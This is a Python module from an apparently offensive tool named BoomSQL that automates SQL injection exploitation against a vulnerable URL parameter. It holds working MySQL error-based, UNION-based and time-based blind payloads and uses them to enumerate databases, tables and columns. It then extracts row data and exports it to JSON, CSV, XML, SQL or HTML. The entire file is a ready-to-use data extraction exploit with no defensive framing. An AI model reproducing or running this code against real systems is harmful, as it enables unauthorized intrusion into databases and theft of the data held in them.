"""
Fast Database Dumper for BoomSQL
SQLMap-style optimized database enumeration and extraction
"""

import asyncio
import json
import csv
import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Any, Union
from pathlib import Path
from datetime import datetime
from dataclasses import dataclass, field
from enum import Enum
import re
import time
import html
import threading
import concurrent.futures
from urllib.parse import urlencode, parse_qs, urlparse, parse_qsl

from .fallbacks import aiohttp, ClientSession, AIOHTTP_AVAILABLE
from .sql_injection_engine import VulnerabilityResult, DatabaseType, InjectionType, InjectionVector
from .logger import LoggerMixin

class ExportFormat(Enum):
    """Export formats"""
    JSON = "json"
    CSV = "csv"
    XML = "xml"
    SQL = "sql"
    HTML = "html"

@dataclass
class DatabaseInfo:
    """Database information"""
    name: str
    version: str = ""
    user: str = ""
    hostname: str = ""
    port: int = 0
    tables: List['TableInfo'] = field(default_factory=list)
    
@dataclass
class TableInfo:
    """Table information"""
    name: str
    schema: str = ""
    row_count: int = 0
    columns: List['ColumnInfo'] = field(default_factory=list)
    data: List[Dict[str, Any]] = field(default_factory=list)
    
@dataclass
class ColumnInfo:
    """Column information"""
    name: str
    type: str
    length: int
    nullable: bool = True
    primary_key: bool = False

class FastDatabaseDumper(LoggerMixin):
    """Fast database dumper with SQLMap-style techniques"""
    
    def __init__(self, vulnerability: VulnerabilityResult, config: Dict[str, Any]):
        self.vulnerability = vulnerability
        self.config = config
        self.session = None
        self.database_info = None
        self.progress = None
        self.is_dumping = False
        self.cancel_requested = False
        
        # Fast extraction settings
        self.max_threads = config.get("MaxThreads", 10)
        self.request_delay = config.get("RequestDelay", 0) / 1000
        self.timeout = config.get("RequestTimeout", 10)
        
        # Database type detection
        self.db_type = self.detect_database_type()
        
        # Initialize session
        self.init_session()
        
    def detect_database_type(self) -> DatabaseType:
        """Detect database type from vulnerability"""
        if hasattr(self.vulnerability, 'database_type'):
            return self.vulnerability.database_type
        return DatabaseType.MYSQL  # Default to MySQL
        
    def init_session(self):
        """Initialize aiohttp session for concurrent requests"""
        # Don't initialize session in __init__ to avoid event loop issues
        # Session will be initialized in async context when needed
        self.session = None
        
    async def ensure_session(self):
        """Ensure session is initialized"""
        if self.session is None:
            if AIOHTTP_AVAILABLE:
                timeout = aiohttp.ClientTimeout(total=self.timeout)
                connector = aiohttp.TCPConnector(
                    limit=self.max_threads * 2,
                    ssl=False,
                    enable_cleanup_closed=True
                )
                
                self.session = aiohttp.ClientSession(
                    timeout=timeout,
                    connector=connector,
                    headers={
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate',
                        'Connection': 'keep-alive'
                    }
                )
            else:
                self.session = ClientSession()
        
    async def close(self):
        """Close the session"""
        if self.session:
            await self.session.close()
            
    async def dump_database(self, progress_callback=None) -> List[DatabaseInfo]:
        """Fast database dumping using optimized techniques"""
        await self.ensure_session()  # Ensure session is initialized
        
        self.progress = progress_callback
        self.is_dumping = True
        
        databases = []
        
        try:
            # Step 1: Get basic database info (fast)
            self.log_info("🚀 Starting fast database enumeration...")
            if progress_callback:
                progress_callback("Getting database information...")
            
            version = await self.fast_extract("SELECT version()")
            user = await self.fast_extract("SELECT user()")
            hostname = await self.fast_extract("SELECT @@hostname")
            current_db = await self.fast_extract("SELECT database()")
            
            self.log_info(f"✅ Database: {current_db or 'unknown'}")
            self.log_info(f"✅ Version: {version}")
            self.log_info(f"✅ User: {user}")
            self.log_info(f"✅ Hostname: {hostname}")
            
            # Step 2: Get database names (fast concurrent)
            if progress_callback:
                progress_callback("Enumerating databases...")
            
            db_names = await self.get_database_names()
            self.log_info(f"✅ Found {len(db_names)} databases: {', '.join(db_names)}")
            
            # Step 3: For each database, get tables (concurrent)
            for db_name in db_names:
                if self.cancel_requested:
                    break
                    
                if progress_callback:
                    progress_callback(f"Enumerating tables in {db_name}...")
                
                db_info = DatabaseInfo(
                    name=db_name,
                    version=version,
                    user=user,
                    hostname=hostname
                )
                
                # Get tables concurrently
                tables = await self.get_table_names(db_name)
                self.log_info(f"✅ Found {len(tables)} tables in {db_name}: {', '.join(tables)}")
                
                # Step 4: For each table, get columns and data (concurrent)
                for table_name in tables:
                    if self.cancel_requested:
                        break
                        
                    if progress_callback:
                        progress_callback(f"Extracting {db_name}.{table_name}...")
                    
                    table_info = TableInfo(
                        name=table_name,
                        schema=db_name
                    )
                    
                    # Get columns concurrently
                    columns = await self.get_column_names(db_name, table_name)
                    self.log_info(f"✅ Found {len(columns)} columns in {table_name}: {', '.join(columns)}")
                    
                    # Create column info
                    for col_name in columns:
                        col_info = ColumnInfo(name=col_name, type="VARCHAR", length=255)
                        table_info.columns.append(col_info)
                    
                    # Get row count
                    row_count = await self.get_row_count(db_name, table_name)
                    table_info.row_count = int(row_count) if row_count.isdigit() else 0
                    
                    # Get sample data (first 10 rows)
                    if table_info.row_count > 0:
                        sample_data = await self.get_table_data(db_name, table_name, columns, limit=10)
                        table_info.data = sample_data
                        self.log_info(f"✅ Extracted {len(sample_data)} rows from {table_name}")
                    
                    db_info.tables.append(table_info)
                
                databases.append(db_info)
            
            self.log_info(f"🎉 Database dump completed! Found {len(databases)} databases")
            
        except Exception as e:
            self.log_error(f"Database dump failed: {e}")
            
        finally:
            self.is_dumping = False
            
        return databases
    
    async def fast_extract(self, query: str) -> str:
        """Fast data extraction using error-based injection"""
        try:
            # Try error-based extraction first (fastest)
            result = await self.error_based_extract(query)
            if result:
                return result
                
            # Fallback to union-based
            result = await self.union_based_extract(query)
            if result:
                return result
                
            # Last resort: time-based (but limit to single characters)
            result = await self.limited_time_based_extract(query, max_length=50)
            return result
            
        except Exception as e:
            self.log_error(f"Fast extraction failed for query '{query}': {e}")
            return ""
    
    async def error_based_extract(self, query: str) -> str:
        """Extract data using error-based injection"""
        # MySQL error-based payloads
        payloads = [
            f"1' AND EXTRACTVALUE(1, CONCAT(0x7e, ({query}), 0x7e)) AND '1'='1",
            f"1' AND UPDATEXML(1, CONCAT(0x7e, ({query}), 0x7e), 1) AND '1'='1",
            f"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(({query}),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND '1'='1"
        ]
        
        for payload in payloads:
            response = await self.test_payload(payload)
            if response:
                # Extract data from MySQL error message
                match = re.search(r'~([^~]+)~', response)
                if match:
                    return match.group(1)
                    
                # Look for other error patterns
                match = re.search(r"Duplicate entry '([^']+)'", response)
                if match:
                    return match.group(1)
        
        return ""
    
    async def union_based_extract(self, query: str) -> str:
        """Extract data using UNION-based injection"""
        # Try to detect column count first
        column_count = await self.detect_column_count()
        if column_count == 0:
            return ""
        
        # Build UNION payload
        null_columns = ['NULL'] * (column_count - 1)
        payload = f"1' UNION SELECT {','.join(null_columns)}, ({query}) AND '1'='1"
        
        response = await self.test_payload(payload)
        if response:
            # Extract data from response (simplified)
            lines = response.split('\n')
            for line in lines:
                if line.strip() and not any(word in line.lower() for word in ['error', 'warning', 'mysql']):
                    return line.strip()
        
        return ""
    
    async def limited_time_based_extract(self, query: str, max_length: int = 50) -> str:
        """Limited time-based extraction for fallback"""
        result = ""
        
        for pos in range(1, max_length + 1):
            if self.cancel_requested:
                break
                
            # Try common characters first
            common_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.-_@:'
            found_char = False
            
            for char in common_chars:
                payload = f"1' AND IF(ASCII(SUBSTRING(({query}), {pos}, 1))={ord(char)}, SLEEP(2), 0) AND '1'='1"
                
                start_time = time.time()
                response = await self.test_payload(payload)
                elapsed = time.time() - start_time
                
                if elapsed >= 2:  # Sleep executed
                    result += char
                    found_char = True
                    break
            
            if not found_char:
                break
        
        return result
    
    async def detect_column_count(self) -> int:
        """Detect number of columns for UNION injection"""
        # Try ORDER BY method first
        for i in range(1, 21):
            payload = f"1' ORDER BY {i} AND '1'='1"
            response = await self.test_payload(payload)
            if not response or 'Unknown column' in response:
                return i - 1
        
        return 0
    
    async def get_database_names(self) -> List[str]:
        """Get list of database names using concurrent requests"""
        databases = []
        
        # Use concurrent extraction
        for i in range(20):  # Try up to 20 databases
            query = f"SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys') LIMIT 1 OFFSET {i}"
            db_name = await self.fast_extract(query)
            if db_name and db_name not in databases:
                databases.append(db_name)
            else:
                break
        
        return databases
    
    async def get_table_names(self, database: str) -> List[str]:
        """Get list of table names for a database"""
        tables = []
        
        for i in range(50):  # Try up to 50 tables
            query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{database}' LIMIT 1 OFFSET {i}"
            table_name = await self.fast_extract(query)
            if table_name and table_name not in tables:
                tables.append(table_name)
            else:
                break
        
        return tables
    
    async def get_column_names(self, database: str, table: str) -> List[str]:
        """Get list of column names for a table"""
        columns = []
        
        for i in range(50):  # Try up to 50 columns
            query = f"SELECT column_name FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}' LIMIT 1 OFFSET {i}"
            column_name = await self.fast_extract(query)
            if column_name and column_name not in columns:
                columns.append(column_name)
            else:
                break
        
        return columns
    
    async def get_row_count(self, database: str, table: str) -> str:
        """Get row count for a table"""
        query = f"SELECT COUNT(*) FROM {database}.{table}"
        return await self.fast_extract(query)
    
    async def get_table_data(self, database: str, table: str, columns: List[str], limit: int = 10) -> List[Dict[str, Any]]:
        """Get sample data from a table"""
        data = []
        
        column_list = ','.join(columns)
        
        for i in range(limit):
            row_data = {}
            for col in columns:
                query = f"SELECT {col} FROM {database}.{table} LIMIT 1 OFFSET {i}"
                value = await self.fast_extract(query)
                row_data[col] = value
            
            # Only add row if it has data
            if any(value for value in row_data.values()):
                data.append(row_data)
            else:
                break
        
        return data
    
    async def test_payload(self, payload: str) -> str:
        """Test a payload and return response"""
        await self.ensure_session()  # Ensure session is initialized
        
        try:
            # Parse URL and inject payload
            parsed = urlparse(self.vulnerability.url)
            params = dict(parse_qsl(parsed.query))
            
            # Inject payload into the correct parameter
            param_name = self.vulnerability.injection_point.name
            params[param_name] = payload
            
            # Build new URL
            new_query = urlencode(params)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
            
            # Make request
            async with self.session.get(test_url) as response:
                if response.status == 200:
                    return await response.text()
                    
        except Exception as e:
            self.log_error(f"Payload test failed: {e}")
            
        return ""
    
    def cancel_dump(self):
        """Cancel the current dump operation"""
        self.cancel_requested = True
        self.is_dumping = False
        
    def export_data(self, databases: List[DatabaseInfo], output_path: Path, format_type: ExportFormat) -> bool:
        """Export database data to file"""
        try:
            if format_type == ExportFormat.JSON:
                return self.export_json(databases, output_path)
            elif format_type == ExportFormat.CSV:
                return self.export_csv(databases, output_path)
            elif format_type == ExportFormat.XML:
                return self.export_xml(databases, output_path)
            elif format_type == ExportFormat.SQL:
                return self.export_sql(databases, output_path)
            elif format_type == ExportFormat.HTML:
                return self.export_html(databases, output_path)
                
        except Exception as e:
            self.log_error(f"Export failed: {e}")
            
        return False
    
    def export_json(self, databases: List[DatabaseInfo], output_path: Path) -> bool:
        """Export to JSON format"""
        try:
            data = {
                "databases": []
            }
            
            for db in databases:
                db_data = {
                    "name": db.name,
                    "version": db.version,
                    "user": db.user,
                    "hostname": db.hostname,
                    "tables": []
                }
                
                for table in db.tables:
                    table_data = {
                        "name": table.name,
                        "row_count": table.row_count,
                        "columns": [col.name for col in table.columns],
                        "data": table.data
                    }
                    db_data["tables"].append(table_data)
                
                data["databases"].append(db_data)
            
            with open(output_path, 'w') as f:
                json.dump(data, f, indent=2)
            
            return True
            
        except Exception as e:
            self.log_error(f"JSON export failed: {e}")
            return False
    
    def export_csv(self, databases: List[DatabaseInfo], output_path: Path) -> bool:
        """Export to CSV format"""
        try:
            with open(output_path, 'w', newline='') as f:
                writer = csv.writer(f)
                writer.writerow(['Database', 'Table', 'Column', 'Value'])
                
                for db in databases:
                    for table in db.tables:
                        for row in table.data:
                            for col, value in row.items():
                                writer.writerow([db.name, table.name, col, value])
            
            return True
            
        except Exception as e:
            self.log_error(f"CSV export failed: {e}")
            return False
    
    def export_sql(self, databases: List[DatabaseInfo], output_path: Path) -> bool:
        """Export to SQL format"""
        try:
            with open(output_path, 'w') as f:
                f.write("-- BoomSQL Database Dump\\n")
                f.write(f"-- Generated: {datetime.now()}\\n\\n")
                
                for db in databases:
                    f.write(f"-- Database: {db.name}\\n")
                    f.write(f"CREATE DATABASE IF NOT EXISTS `{db.name}`;\\n")
                    f.write(f"USE `{db.name}`;\\n\\n")
                    
                    for table in db.tables:
                        # Create table
                        f.write(f"CREATE TABLE IF NOT EXISTS `{table.name}` (\\n")
                        for i, col in enumerate(table.columns):
                            comma = "," if i < len(table.columns) - 1 else ""
                            f.write(f"  `{col.name}` {col.type}{comma}\\n")
                        f.write(");\\n\\n")
                        
                        # Insert data
                        if table.data:
                            columns = [col.name for col in table.columns]
                            f.write(f"INSERT INTO `{table.name}` ({','.join(f'`{col}`' for col in columns)}) VALUES\\n")
                            
                            for i, row in enumerate(table.data):
                                values = [f"'{row.get(col, '')}'" for col in columns]
                                comma = "," if i < len(table.data) - 1 else ";"
                                f.write(f"({','.join(values)}){comma}\\n")
                            
                            f.write("\\n")
            
            return True
            
        except Exception as e:
            self.log_error(f"SQL export failed: {e}")
            return False
    
    def export_html(self, databases: List[DatabaseInfo], output_path: Path) -> bool:
        """Export to HTML format"""
        try:
            with open(output_path, 'w') as f:
                f.write("""<!DOCTYPE html>
<html>
<head>
    <title>BoomSQL Database Dump</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .database { margin-bottom: 30px; }
        .table { margin-bottom: 20px; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
        .info { background-color: #e7f3ff; padding: 10px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <h1>BoomSQL Database Dump</h1>
""")
                
                for db in databases:
                    f.write(f'<div class="database">')
                    f.write(f'<h2>Database: {db.name}</h2>')
                    f.write(f'<div class="info">')
                    f.write(f'<p><strong>Version:</strong> {db.version}</p>')
                    f.write(f'<p><strong>User:</strong> {db.user}</p>')
                    f.write(f'<p><strong>Hostname:</strong> {db.hostname}</p>')
                    f.write(f'</div>')
                    
                    for table in db.tables:
                        f.write(f'<div class="table">')
                        f.write(f'<h3>Table: {table.name} ({table.row_count} rows)</h3>')
                        
                        if table.data:
                            f.write('<table>')
                            # Header
                            f.write('<tr>')
                            for col in table.columns:
                                f.write(f'<th>{html.escape(col.name)}</th>')
                            f.write('</tr>')
                            
                            # Data
                            for row in table.data:
                                f.write('<tr>')
                                for col in table.columns:
                                    value = row.get(col.name, '')
                                    f.write(f'<td>{html.escape(str(value))}</td>')
                                f.write('</tr>')
                            
                            f.write('</table>')
                        
                        f.write('</div>')
                    
                    f.write('</div>')
                
                f.write('</body></html>')
            
            return True
            
        except Exception as e:
            self.log_error(f"HTML export failed: {e}")
            return False
    
    def export_xml(self, databases: List[DatabaseInfo], output_path: Path) -> bool:
        """Export to XML format"""
        try:
            root = ET.Element("databases")
            
            for db in databases:
                db_elem = ET.SubElement(root, "database")
                db_elem.set("name", db.name)
                db_elem.set("version", db.version)
                db_elem.set("user", db.user)
                db_elem.set("hostname", db.hostname)
                
                for table in db.tables:
                    table_elem = ET.SubElement(db_elem, "table")
                    table_elem.set("name", table.name)
                    table_elem.set("row_count", str(table.row_count))
                    
                    for row in table.data:
                        row_elem = ET.SubElement(table_elem, "row")
                        for col, value in row.items():
                            col_elem = ET.SubElement(row_elem, "column")
                            col_elem.set("name", col)
                            col_elem.text = str(value)
            
            tree = ET.ElementTree(root)
            tree.write(output_path, encoding='utf-8', xml_declaration=True)
            
            return True
            
        except Exception as e:
            self.log_error(f"XML export failed: {e}")
            return False


# For backward compatibility
DatabaseDumper = FastDatabaseDumper
